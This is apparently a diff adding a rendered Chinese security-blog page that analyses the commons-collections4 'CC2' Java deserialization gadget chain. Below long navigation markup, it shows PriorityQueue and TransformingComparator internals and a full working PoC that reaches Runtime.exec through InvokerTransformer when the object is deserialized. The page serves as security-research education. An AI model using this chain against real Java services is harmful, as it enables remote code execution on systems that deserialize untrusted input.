+      <a href="../../web/JavaBean/" class="md-nav__link">
+        JavaBean
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Listener/" class="md-nav__link">
+        Listener
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/MVC/" class="md-nav__link">
+        MVC
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/ServletContext/" class="md-nav__link">
+        ServletContext
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Session/" class="md-nav__link">
+        Session
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../web/Tomcat/" class="md-nav__link">
+        Tomcat
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_3" data-md-state="indeterminate" type="checkbox" id="__nav_3_3" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_3">
+          前人之路
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="前人之路" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_3">
+          <span class="md-nav__icon md-icon"></span>
+          前人之路
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%89%8D%E4%BA%BA%E4%B9%8B%E8%B7%AF/thinkphp%205.1.x%20RCE/" class="md-nav__link">
+        thinkphp 5.1.x RCE
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4" data-md-state="indeterminate" type="checkbox" id="__nav_3_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_4">
+          安全研究
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="安全研究" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_4">
+          <span class="md-nav__icon md-icon"></span>
+          安全研究
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/CodeQL%E4%B8%8Egolang%20sql%E6%B3%A8%E5%85%A5%E6%A3%80%E6%B5%8B/" class="md-nav__link">
+        CodeQL与golang sql注入检测
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/flask%E4%B8%8D%E5%87%BA%E7%BD%91%E5%9B%9E%E6%98%BE%E6%96%B9%E5%BC%8F/" class="md-nav__link">
+        flask不出网回显方式
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/python%E5%8F%97%E9%99%90%E7%9A%84%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8E%E9%BB%91%E9%AD%94%E6%B3%95/" class="md-nav__link">
+        python受限的任意代码执行与黑魔法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/register_argc_argv%E4%B8%8Einclude%20to%20RCE%E7%9A%84%E5%B7%A7%E5%A6%99%E7%BB%84%E5%90%88/" class="md-nav__link">
+        register_argc_argv与include to RCE的巧妙组合
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/webshell%E5%85%8D%E6%9D%80%E6%80%BB%E7%BB%93/" class="md-nav__link">
+        webshell免杀总结
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/%E4%BB%BB%E6%84%8F%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E4%B8%8B%E7%9A%84php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/" class="md-nav__link">
+        任意代码执行下的php原生类利用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_4_7" data-md-state="indeterminate" type="checkbox" id="__nav_3_4_7" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_4_7">
+          Codeql
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Codeql" data-md-level="3">
+        <label class="md-nav__title" for="__nav_3_4_7">
+          <span class="md-nav__icon md-icon"></span>
+          Codeql
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/1.CodeQL%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" class="md-nav__link">
+        1.CodeQL安装与使用
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/2.CodeQL%E8%AF%AD%E6%B3%95/" class="md-nav__link">
+        CodeQL语法
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/codeql/codeql/" class="md-nav__link">
+        codeql Overview
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3_5" data-md-state="indeterminate" type="checkbox" id="__nav_3_5" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_3_5">
+          静态分析
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="静态分析" data-md-level="2">
+        <label class="md-nav__title" for="__nav_3_5">
+          <span class="md-nav__icon md-icon"></span>
+          静态分析
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/DataFlowAnalysis-Applications/" class="md-nav__link">
+        Data Flow Analysis - Applications
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../%E9%9D%99%E6%80%81%E5%88%86%E6%9E%90/IntermediateRepresentation%28%E4%B8%AD%E9%97%B4%E8%AF%AD%E8%A8%80%29/" class="md-nav__link">
+        Intermediate Representation(中间语言)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" data-md-state="indeterminate" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          杂项
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="杂项" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          杂项
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4_1" data-md-state="indeterminate" type="checkbox" id="__nav_4_1" checked>
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_4_1">
+          配置
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="配置" data-md-level="2">
+        <label class="md-nav__title" for="__nav_4_1">
+          <span class="md-nav__icon md-icon"></span>
+          配置
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../%E6%9D%82%E9%A1%B9/%E9%85%8D%E7%BD%AE/%E5%85%B3%E4%BA%8Ewindows%E6%8F%90%E5%8D%87%E6%95%88%E7%8E%87%E9%82%A3%E4%BA%9B%E4%BA%8B/" class="md-nav__link">
+        关于windows提升效率那些事
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../tags.html" class="md-nav__link">
+        Tags
+      </a>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+    
+        
+            <a href = "/tags.html#java" title="java" class="md-tag">
+                #java&nbsp;
+            </a>
+        
+            <a href = "/tags.html#java安全" title="java安全" class="md-tag">
+                #java安全&nbsp;
+            </a>
+        
+    
+    
+    
+    <div style="float:right"><span id="busuanzi_container_page_pv"><font size="2" color="grey">本文阅读量&nbsp;<span id="busuanzi_value_page_pv"></span></font></span></div>
+    
+  
+                
+
+<h1 id="反序列化cc篇补充">反序列化CC篇补充<a class="headerlink" href="#反序列化cc篇补充" title="Permanent link">#</a></h1>
+<h2 id="cc2">CC2<a class="headerlink" href="#cc2" title="Permanent link">#</a></h2>
+<h3 id="入口">入口<a class="headerlink" href="#入口" title="Permanent link">#</a></h3>
+<p>首先，CC2的使用条件是commons-collections4.x版本，为什么不能用3.x版本呢？因为<code>TransformingComparator</code>类在3.x版本中没有实现<code>Serializable</code>接口，无法被序列化。<br />
+所以我们先在pom.xml中添加以下依赖:<br />
+<div class="highlight"><pre><span></span><code><span class="nt">&lt;dependency&gt;</span>  
+ <span class="nt">&lt;groupId&gt;</span>org.apache.commons<span class="nt">&lt;/groupId&gt;</span>  
+ <span class="nt">&lt;artifactId&gt;</span>commons-collections4<span class="nt">&lt;/artifactId&gt;</span>  
+ <span class="nt">&lt;version&gt;</span>4.0<span class="nt">&lt;/version&gt;</span>  
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div></p>
+<p>CC2的入口使用了<code>PriorityQueue</code>和<code>TransformingComparator</code>，其readObject方法会最终调用到<code>comparer.comare</code>，而<code>TransformingComparator</code>的<code>compare</code>方法则会调用<code>this.transformer.transform</code>方法，从而拼接上链的后半部分。</p>
+<h3 id="priorityqueue关键代码">PriorityQueue关键代码<a class="headerlink" href="#priorityqueue关键代码" title="Permanent link">#</a></h3>
+<p>调用链为<code>PriorityQueue.readObject()</code>-&gt;<code>PriorityQueue.heapify()</code>-&gt;<code>PriorityQueue.siftDown()</code>-&gt;<code>PriorityQueue.siftDownUsingComparator()</code>-&gt;<code>comparator.compare()</code>:<br />
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">PriorityQueue</span><span class="o">&lt;</span><span class="n">E</span><span class="o">&gt;</span> <span class="kd">extends</span> <span class="n">AbstractQueue</span><span class="o">&lt;</span><span class="n">E</span><span class="o">&gt;</span> <span class="kd">implements</span> <span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">Serializable</span> <span class="p">{</span>
+ <span class="c1">// ...</span>
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">readObject</span><span class="p">(</span><span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">ObjectInputStream</span> <span class="n">s</span><span class="p">)</span>
+        <span class="kd">throws</span> <span class="n">java</span><span class="p">.</span><span class="na">io</span><span class="p">.</span><span class="na">IOException</span><span class="p">,</span> <span class="n">ClassNotFoundException</span> <span class="p">{</span>
+        <span class="c1">// Read in size, and any hidden stuff</span>
+        <span class="n">s</span><span class="p">.</span><span class="na">defaultReadObject</span><span class="p">();</span>
+
+        <span class="c1">// Read in (and discard) array length</span>
+        <span class="n">s</span><span class="p">.</span><span class="na">readInt</span><span class="p">();</span>
+
+        <span class="n">SharedSecrets</span><span class="p">.</span><span class="na">getJavaOISAccess</span><span class="p">().</span><span class="na">checkArray</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+        <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="n">size</span><span class="o">]</span><span class="p">;</span>
+
+        <span class="c1">// Read in all elements.</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">size</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
+            <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+
+        <span class="c1">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span>
+        <span class="c1">// spec has never explained what that might be.</span>
+        <span class="n">heapify</span><span class="p">();</span>
+    <span class="p">}</span>
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">heapify</span><span class="p">()</span> <span class="p">{</span>
+        <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="p">(</span><span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span> <span class="n">i</span> <span class="o">&gt;=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span><span class="o">--</span><span class="p">)</span>
+            <span class="n">siftDown</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="p">(</span><span class="n">E</span><span class="p">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">i</span><span class="o">]</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">siftDown</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span><span class="p">,</span> <span class="n">E</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">comparator</span> <span class="o">!=</span> <span class="kc">null</span><span class="p">)</span>
+            <span class="n">siftDownUsingComparator</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
+        <span class="k">else</span>
+            <span class="n">siftDownComparable</span><span class="p">(</span><span class="n">k</span><span class="p">,</span> <span class="n">x</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="kd">private</span> <span class="kt">void</span> <span class="nf">siftDownUsingComparator</span><span class="p">(</span><span class="kt">int</span> <span class="n">k</span><span class="p">,</span> <span class="n">E</span> <span class="n">x</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kt">int</span> <span class="n">half</span> <span class="o">=</span> <span class="n">size</span> <span class="o">&gt;&gt;&gt;</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="k">while</span> <span class="p">(</span><span class="n">k</span> <span class="o">&lt;</span> <span class="n">half</span><span class="p">)</span> <span class="p">{</span>
+            <span class="kt">int</span> <span class="n">child</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span> <span class="o">&lt;&lt;</span> <span class="mi">1</span><span class="p">)</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="n">Object</span> <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span><span class="o">]</span><span class="p">;</span>
+            <span class="kt">int</span> <span class="n">right</span> <span class="o">=</span> <span class="n">child</span> <span class="o">+</span> <span class="mi">1</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">right</span> <span class="o">&lt;</span> <span class="n">size</span> <span class="o">&amp;&amp;</span>
+                <span class="n">comparator</span><span class="p">.</span><span class="na">compare</span><span class="p">((</span><span class="n">E</span><span class="p">)</span> <span class="n">c</span><span class="p">,</span> <span class="p">(</span><span class="n">E</span><span class="p">)</span> <span class="n">queue</span><span class="o">[</span><span class="n">right</span><span class="o">]</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="n">c</span> <span class="o">=</span> <span class="n">queue</span><span class="o">[</span><span class="n">child</span> <span class="o">=</span> <span class="n">right</span><span class="o">]</span><span class="p">;</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">comparator</span><span class="p">.</span><span class="na">compare</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="p">(</span><span class="n">E</span><span class="p">)</span> <span class="n">c</span><span class="p">)</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">c</span><span class="p">;</span>
+            <span class="n">k</span> <span class="o">=</span> <span class="n">child</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="n">queue</span><span class="o">[</span><span class="n">k</span><span class="o">]</span> <span class="o">=</span> <span class="n">x</span><span class="p">;</span>
+    <span class="p">}</span>
+<span class="c1">// ...</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<h3 id="transformingcomparator关键代码">TransformingComparator关键代码<a class="headerlink" href="#transformingcomparator关键代码" title="Permanent link">#</a></h3>
+<div class="highlight"><pre><span></span><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">TransformingComparator</span><span class="o">&lt;</span><span class="n">I</span><span class="p">,</span> <span class="n">O</span><span class="o">&gt;</span> <span class="kd">implements</span> <span class="n">Comparator</span><span class="o">&lt;</span><span class="n">I</span><span class="o">&gt;</span><span class="p">,</span> <span class="n">Serializable</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kt">int</span> <span class="nf">compare</span><span class="p">(</span><span class="n">I</span> <span class="n">obj1</span><span class="p">,</span> <span class="n">I</span> <span class="n">obj2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">O</span> <span class="n">value1</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">transformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">obj1</span><span class="p">);</span>
+        <span class="n">O</span> <span class="n">value2</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="na">transformer</span><span class="p">.</span><span class="na">transform</span><span class="p">(</span><span class="n">obj2</span><span class="p">);</span>
+        <span class="k">return</span> <span class="k">this</span><span class="p">.</span><span class="na">decorated</span><span class="p">.</span><span class="na">compare</span><span class="p">(</span><span class="n">value1</span><span class="p">,</span> <span class="n">value2</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<h3 id="初始版本的poc">初始版本的poc<a class="headerlink" href="#初始版本的poc" title="Permanent link">#</a></h3>
+<h4 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">#</a></h4>
+<p>poc如下:<br />
+<div class="highlight"><pre><span></span><code><span class="kn">import</span> <span class="nn">org.apache.commons.collections4.Transformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.comparators.TransformingComparator</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ChainedTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.ConstantTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.functors.InvokerTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.keyvalue.TiedMapEntry</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">org.apache.commons.collections4.map.LazyMap</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nn">javax.management.BadAttributeValueExpException</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ByteArrayOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.io.ObjectOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.lang.reflect.Field</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.HashMap</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.Map</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nn">java.util.PriorityQueue</span><span class="p">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">CC2</span> <span class="p">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="p">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">fakeTransformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span> <span class="p">{</span><span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">)};</span>
+        <span class="n">Transformer</span><span class="o">[]</span> <span class="n">transformers</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Transformer</span><span class="o">[]</span><span class="p">{</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="n">Runtime</span><span class="p">.</span><span class="na">class</span><span class="p">),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;getMethod&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;getRuntime&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;invoke&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">Object</span><span class="p">.</span><span class="na">class</span><span class="p">,</span> <span class="n">Object</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="kc">null</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">InvokerTransformer</span><span class="p">(</span><span class="s">&quot;exec&quot;</span><span class="p">,</span> <span class="k">new</span> <span class="n">Class</span><span class="o">[]</span><span class="p">{</span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">},</span> <span class="k">new</span> <span class="n">Object</span><span class="o">[]</span><span class="p">{</span><span class="s">&quot;calc.exe&quot;</span><span class="p">}),</span>
+                <span class="k">new</span> <span class="n">ConstantTransformer</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
+        <span class="p">};</span>
+
+        <span class="c1">// 先使用fakeTransformer防止本地命令执行</span>
+        <span class="n">Transformer</span> <span class="n">transformerChain</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ChainedTransformer</span><span class="p">(</span><span class="n">fakeTransformers</span><span class="p">);</span>
+        <span class="n">TransformingComparator</span> <span class="n">comparator</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransformingComparator</span><span class="p">(</span><span class="n">transformerChain</span><span class="p">);</span>
+        <span class="n">PriorityQueue</span> <span class="n">queue</span> <span class="o">=</span> <span class="k">new</span> <span class="n">PriorityQueue</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+
+        <span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">queue</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+
+
+        <span class="c1">// 使用反射替换transformerChain的transformers</span>
+        <span class="n">Field</span> <span class="n">f</span> <span class="o">=</span> <span class="n">ChainedTransformer</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;iTransformers&quot;</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">transformerChain</span><span class="p">,</span> <span class="n">transformers</span><span class="p">);</span>
+        <span class="c1">// 使用反射替换TransformingComparator的comparator</span>
+        <span class="n">f</span> <span class="o">=</span> <span class="n">Class</span><span class="p">.</span><span class="na">forName</span><span class="p">(</span><span class="s">&quot;java.util.PriorityQueue&quot;</span><span class="p">).</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="s">&quot;comparator&quot;</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span>
+        <span class="n">f</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">queue</span><span class="p">,</span><span class="n">comparator</span><span class="p">);</span>
+
+
+        <span class="n">ByteArrayOutputStream</span> <span class="n">barr</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">();</span>
+        <span class="n">ObjectOutputStream</span> <span class="n">oos</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectOutputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">writeObject</span><span class="p">(</span><span class="n">queue</span><span class="p">);</span>
+        <span class="n">oos</span><span class="p">.</span><span class="na">close</span><span class="p">();</span>
+
+        <span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">barr</span><span class="p">);</span>
+        <span class="n">ObjectInputStream</span> <span class="n">ois</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ObjectInputStream</span><span class="p">(</span><span class="k">new</span> <span class="n">ByteArrayInputStream</span><span class="p">(</span><span class="n">barr</span><span class="p">.</span><span class="na">toByteArray</span><span class="p">()));</span>
+        <span class="n">Object</span> <span class="n">o</span> <span class="o">=</span> <span class="p">(</span><span class="n">Object</span><span class="p">)</span> <span class="n">ois</span><span class="p">.</span><span class="na">readObject</span><span class="p">();</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></p>
+<p>这个poc有几个需要注意的点:<br />
+1. 需要往queue里add两个值进去，这是为了其size能大于1，能进入heapify中for循环的逻辑<br />
+2. 需要在add值之后才通过反射设置comparator，这是因为add存在以下调用链: <code>PriorityQueue.add()</code>-&gt;<code>PriorityQueue.offer()</code>-&gt;<code>PriorityQueue.siftUp()</code>-&gt;<code>siftUpUsingComparator()</code>-&gt;<code>comparator.compare()</code>，这会导致我们的链提前触发，而且会产生报错(这里参考了 <a href="https://paper.seebug.org/1242/#commonscollections-2">https://paper.seebug.org/1242/#commonscollections-2</a> 这篇文章，但是经过测试提前设置并不会出错)</p>
+<h4 id="调用逻辑">调用逻辑<a class="headerlink" href="#调用逻辑" title="Permanent link">#</a></h4>
+<p>整条链的调用逻辑为:<br />
+<div class="highlight"><pre><span></span><code>PriorityQueue.readObject()
+  PriorityQueue.heapify()
+  PriorityQueue.siftDown()
+  PriorityQueue.siftDownUsingComparator()
+  comparator.compare() === TransformingComparator.compare()
+    ChainedTransformer.transform()
+      ConstantTransformer.transform() // 获取Runtime.class
+      InvokerTransformer.transform()   // 获取Runtime.getRuntime
+      InvokerTransformer.transform()   // 获取Runtime实例
+      InvokerTransformer.transform()   // 调用exec方法触发rce
+</code></pre></div></p>
+<h3 id="另外一个版本的poc">另外一个版本的poc<a class="headerlink" href="#另外一个版本的poc" title="Permanent link">#</a></h3>
+<p>另外一个版本的poc的终点不再是我们熟悉的<code>ChainedTransformer</code>那一套回调造成的命令执行，而是可以造成任意java代码执行的<code>TemplatesImpl</code>:<br />
+<img alt="" src="https://gitee.com/guuest/images/raw/master/img/20211107182759.png" /><br />
